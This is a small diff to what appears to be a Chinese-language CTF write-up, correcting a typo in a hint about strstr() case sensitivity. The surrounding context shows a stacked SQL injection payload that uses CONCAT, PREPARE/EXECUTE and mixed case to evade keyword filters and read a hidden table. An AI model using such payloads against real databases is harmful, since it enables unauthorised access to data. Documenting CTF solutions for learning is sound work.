@@ -37,7 +37,7 @@ execute payload;
 deallocate prepare payload;
 ```
 
-做到最后后一个hint：strstr（）是提示我们大小写的，多试着改几次
+做到最后一个hint：strstr（）是提示我们大小写的，多试着改几次
 ```sql
 id=1') or (ascii(substr(database(),4,1)))=105;SET @SQL=CONCAT('sele','ct content From `1145141919810`'); PREPARE PAYLOAD FROM @sql;EXECUTE Payload;Deallocate prePare payload;Show Columns From `1145141919810` ;#
 ```
